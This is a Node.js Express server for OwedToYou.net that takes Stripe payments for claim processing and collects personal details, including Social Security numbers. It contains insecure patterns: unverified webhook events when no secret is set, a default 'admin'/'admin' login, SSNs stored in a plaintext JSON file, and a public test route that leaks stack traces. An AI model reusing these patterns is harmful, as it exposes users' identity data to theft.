const path = require("path");
const fs = require("fs");
const express = require("express");
const dotenv = require("dotenv");
const Stripe = require("stripe");
const registerShortener = require("./shortener");
const { sendIntakeEmail, sendClaimIdEmail } = require("./fulfillment");

dotenv.config();

const app = express();

// Redirect non-www to www
app.use((req, res, next) => {
  if (req.hostname === "owedtoyou.net") {
    return res.redirect(301, `https://www.owedtoyou.net${req.originalUrl}`);
  }
  next();
});

const port = process.env.PORT || 3000;

const stripeSecretKey = process.env.STRIPE_SECRET_KEY?.trim();
const stripeWebhookSecret = process.env.STRIPE_WEBHOOK_SECRET?.trim();
const stripePriceIdRaw = process.env.STRIPE_PRICE_ID?.trim() || "";
const stripeAmountCents = Number(process.env.STRIPE_AMOUNT_CENTS || 1295);
const stripeCurrency = (process.env.STRIPE_CURRENCY || "usd").toLowerCase();
const publicBaseUrl = process.env.PUBLIC_BASE_URL || `http://localhost:${port}`;
const adminPassword = process.env.ADMIN_PASSWORD || "";

if (!stripeSecretKey) {
  console.warn("Missing STRIPE_SECRET_KEY. Checkout endpoint will fail until it is set.");
}

const stripePriceId =
  stripePriceIdRaw && stripePriceIdRaw.startsWith("price_")
    ? stripePriceIdRaw
    : "";

if (stripePriceIdRaw && !stripePriceId) {
  console.warn(
    `STRIPE_PRICE_ID must start with "price_" (got "${stripePriceIdRaw.slice(0, 12)}..."). ` +
      "Use the Price ID from Product catalog → Pricing, not the Product ID (prod_...)."
  );
}

if (!stripePriceId) {
  console.warn(
    "Missing or invalid STRIPE_PRICE_ID. Falling back to STRIPE_AMOUNT_CENTS/STRIPE_CURRENCY line item."
  );
}

const stripe = stripeSecretKey ? new Stripe(stripeSecretKey) : null;

// ---------------------------------------------------------------------------
// Webhook route — MUST be registered before express.json() so the raw body
// is preserved for Stripe signature verification.
// ---------------------------------------------------------------------------
app.post(
  "/webhook",
  express.raw({ type: "application/json" }),
  async (req, res) => {
    const sig = req.headers["stripe-signature"];

    if (!stripeWebhookSecret) {
      console.warn("[webhook] STRIPE_WEBHOOK_SECRET not set — skipping signature verification");
    }

    let event;
    try {
      if (stripeWebhookSecret && sig) {
        event = stripe.webhooks.constructEvent(req.body, sig, stripeWebhookSecret);
      } else {
        // Fallback: parse body as JSON (for testing without webhook secret)
        const payload = req.body.toString("utf8");
        event = JSON.parse(payload);
      }
    } catch (err) {
      console.error("[webhook] Signature verification failed:", err.message);
      return res.status(400).send(`Webhook Error: ${err.message}`);
    }

    if (event.type === "checkout.session.completed") {
      const session = event.data.object;
      const customerEmail =
        session.customer_details?.email || session.customer_email || "";
      const sessionId = session.id;
      const metadata = session.metadata || {};

      console.log(`[webhook] checkout.session.completed — sessionId: ${sessionId}, email: ${customerEmail}`);

      if (customerEmail) {
        // sendIntakeEmail fails gracefully — no await crash risk
        sendIntakeEmail(customerEmail, sessionId, {
          name: metadata.name || "",
          holder: metadata.holder || "",
          amount: metadata.amount || ""
        }).catch(err => {
          console.error("[webhook] sendIntakeEmail error:", err.message);
        });
      } else {
        console.warn("[webhook] No customer email found in session — intake email not sent");
      }
    }

    res.status(200).json({ received: true });
  }
);

// ---------------------------------------------------------------------------
// Standard JSON middleware (after webhook route)
// ---------------------------------------------------------------------------
app.use(express.json());

// Shortener routes before static so GET /c/:code is never swallowed by express.static
registerShortener(app);
app.use(express.static(path.join(__dirname, "public")));

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
function resolveBaseUrl(req) {
  if (process.env.PUBLIC_BASE_URL) {
    return process.env.PUBLIC_BASE_URL;
  }
  const forwardedProto = req.headers["x-forwarded-proto"];
  const proto = Array.isArray(forwardedProto)
    ? forwardedProto[0]
    : forwardedProto || req.protocol || "https";
  const host = req.headers["x-forwarded-host"] || req.get("host");
  return host ? `${proto}://${host}` : publicBaseUrl;
}

function ensureDataDir() {
  const dataDir = path.join(__dirname, "data");
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
  return dataDir;
}

function loadClaims() {
  const filePath = path.join(__dirname, "data", "claims.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf8"));
  } catch {
    return [];
  }
}

function saveClaims(claims) {
  ensureDataDir();
  fs.writeFileSync(
    path.join(__dirname, "data", "claims.json"),
    JSON.stringify(claims, null, 2),
    "utf8"
  );
}

// Generate a simple claim ID
function generateClaimId() {
  const ts = Date.now().toString(36).toUpperCase();
  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
  return `OTY-${ts}-${rand}`;
}

// ---------------------------------------------------------------------------
// POST /create-checkout-session
// ---------------------------------------------------------------------------
app.post("/create-checkout-session", async (req, res) => {
  try {
    if (!stripe) {
      return res.status(500).json({
        error: "Stripe is not configured. Set STRIPE_SECRET_KEY."
      });
    }

    const lineItem = stripePriceId
      ? {
          price: stripePriceId,
          quantity: 1
        }
      : {
          price_data: {
            currency: stripeCurrency,
            unit_amount: stripeAmountCents,
            product_data: {
              name: "Claim Processing Fee"
            }
          },
          quantity: 1
        };

    const baseUrl = resolveBaseUrl(req);

    // Extract optional metadata from request body (name, holder, amount)
    const { name, holder, amount } = req.body || {};
    const metadata = {};
    if (name) metadata.name = String(name).slice(0, 500);
    if (holder) metadata.holder = String(holder).slice(0, 500);
    if (amount) metadata.amount = String(amount).slice(0, 50);

    const sessionParams = {
      mode: "payment",
      line_items: [lineItem],
      // Redirect to intake form with token = checkout session ID
      success_url: `${baseUrl}/claim-info.html?token={CHECKOUT_SESSION_ID}`,
      cancel_url: `${baseUrl}/?checkout=cancelled`,
      billing_address_collection: "auto",
      allow_promotion_codes: true
    };

    if (Object.keys(metadata).length > 0) {
      sessionParams.metadata = metadata;
    }

    const session = await stripe.checkout.sessions.create(sessionParams);

    return res.json({ url: session.url });
  } catch (error) {
    const stripeMsg = error?.message || String(error);
    console.error("Failed to create Stripe Checkout session:", stripeMsg);
    if (error?.raw) {
      console.error("Stripe raw:", JSON.stringify(error.raw, null, 2));
    }

    const debug = process.env.STRIPE_DEBUG === "1" || process.env.STRIPE_DEBUG === "true";
    const invalid = error?.type === "StripeInvalidRequestError";

    let message = "Unable to start secure checkout right now. Please try again.";
    if (invalid) {
      message =
        "Stripe rejected the request. Usually: wrong Price ID, test/live mismatch (sk_test_ vs sk_live_ with price from the other mode), or extra spaces in Railway variables.";
    }

    const body = { error: message };
    if (debug && stripeMsg) {
      body.detail = stripeMsg;
    }

    return res.status(500).json(body);
  }
});

// ---------------------------------------------------------------------------
// POST /submit-claim-info
// ---------------------------------------------------------------------------
app.post("/submit-claim-info", async (req, res) => {
  try {
    const {
      token,
      firstName,
      lastName,
      dob,
      ssn,
      address,
      city,
      state,
      zip,
      email,
      phone
    } = req.body || {};

    if (!firstName || !lastName || !email) {
      return res.status(400).json({ success: false, error: "Missing required fields" });
    }

    const claimId = generateClaimId();
    const record = {
      claimId,
      token: token || "",
      firstName: (firstName || "").trim(),
      lastName: (lastName || "").trim(),
      dob: dob || "",
      ssn: ssn || "",
      address: (address || "").trim(),
      city: (city || "").trim(),
      state: state || "",
      zip: (zip || "").trim(),
      email: (email || "").trim(),
      phone: (phone || "").trim(),
      submittedAt: new Date().toISOString(),
      status: "pending"
    };

    const claims = loadClaims();
    claims.push(record);
    saveClaims(claims);

    console.log(`[submit-claim-info] New claim saved: ${claimId} for ${record.email}`);

    // Send claim ID email — placeholder logs for now, fires async
    sendClaimIdEmail(record.email, claimId, record.firstName).catch(err => {
      console.error("[submit-claim-info] sendClaimIdEmail error:", err.message);
    });

    return res.json({ success: true, claimId });
  } catch (err) {
    console.error("[submit-claim-info] Error:", err.message);
    return res.status(500).json({ success: false, error: "Internal server error" });
  }
});

// ---------------------------------------------------------------------------
// GET /admin/claims — simple admin view protected by basic auth
// ---------------------------------------------------------------------------
app.get("/admin/claims", (req, res) => {
  // Basic auth check
  const authHeader = req.headers.authorization || "";
  const b64 = authHeader.startsWith("Basic ") ? authHeader.slice(6) : "";
  const decoded = b64 ? Buffer.from(b64, "base64").toString("utf8") : "";
  const [user, pass] = decoded.split(":").map(s => s || "");

  const validUser = user === "admin";
  const validPass = adminPassword ? pass === adminPassword : pass === "admin";

  if (!validUser || !validPass) {
    res.set("WWW-Authenticate", 'Basic realm="Admin"');
    return res.status(401).send("Unauthorized");
  }

  const claims = loadClaims();

  const rows = claims.length
    ? claims
        .slice()
        .reverse()
        .map(c => {
          const ssnLast4 = (c.ssn || "").replace(/-/g, "").slice(-4).padStart(4, "*");
          const statusColor =
            c.status === "pending"
              ? "#f59e0b"
              : c.status === "complete"
              ? "#10b981"
              : "#64748b";
          return `<tr>
            <td>${escHtml(c.claimId || "")}</td>
            <td>${escHtml(c.firstName + " " + c.lastName)}</td>
            <td>${escHtml(c.email)}</td>
            <td>${escHtml(c.phone)}</td>
            <td>***-**-${ssnLast4}</td>
            <td style="color:${statusColor};font-weight:600">${escHtml(c.status)}</td>
            <td>${escHtml(c.submittedAt ? new Date(c.submittedAt).toLocaleString() : "")}</td>
          </tr>`;
        })
        .join("")
    : `<tr><td colspan="7" style="text-align:center;color:#64748b;padding:32px">No claims yet</td></tr>`;

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Claims Admin — OwedToYou.net</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#0D1B2A;color:#f1f5f9;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:32px 16px}
  h1{font-size:22px;font-weight:700;margin-bottom:6px}
  .sub{font-size:13px;color:#64748b;margin-bottom:28px}
  .count{display:inline-block;background:#1e293b;border-radius:8px;padding:4px 10px;font-size:13px;color:#94a3b8;margin-left:10px;vertical-align:middle}
  .table-wrap{overflow-x:auto;border-radius:14px;border:1px solid #1e293b}
  table{width:100%;border-collapse:collapse;min-width:700px}
  thead{background:#0f172a}
  th{padding:12px 14px;text-align:left;font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:#64748b;border-bottom:1px solid #1e293b}
  td{padding:12px 14px;font-size:13px;border-bottom:1px solid #1e293b;color:#cbd5e1}
  tr:last-child td{border-bottom:none}
  tr:hover td{background:#0f172a}
  .refresh{display:inline-block;margin-bottom:16px;font-size:13px;color:#10b981;text-decoration:none;background:#052e16;border:1px solid #166534;border-radius:8px;padding:6px 14px}
</style>
</head>
<body>
<h1>Claims Admin <span class="count">${claims.length} total</span></h1>
<p class="sub">OwedToYou.net &mdash; Submitted claims</p>
<a href="/admin/claims" class="refresh">↻ Refresh</a>
<div class="table-wrap">
  <table>
    <thead>
      <tr>
        <th>Claim ID</th>
        <th>Name</th>
        <th>Email</th>
        <th>Phone</th>
        <th>SSN (last 4)</th>
        <th>Status</th>
        <th>Submitted</th>
      </tr>
    </thead>
    <tbody>${rows}</tbody>
  </table>
</div>
</body>
</html>`;

  res.set("Content-Type", "text/html");
  res.send(html);
});

function escHtml(str) {
  return String(str || "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// ---------------------------------------------------------------------------
// Start
// ---------------------------------------------------------------------------
app.listen(port, () => {
  console.log(`Checkout page running on ${publicBaseUrl}`);
});

// Temporary email test endpoint — remove after confirming email works
app.get('/test-email', async (req, res) => {
  const { sendClaimIdEmail } = require('./fulfillment');
  try {
    await sendClaimIdEmail('zacharrow3@gmail.com', 'OTY-TEST-0001', 'Zach');
    res.json({ success: true, message: 'Email sent — check inbox' });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message, stack: e.stack });
  }
});
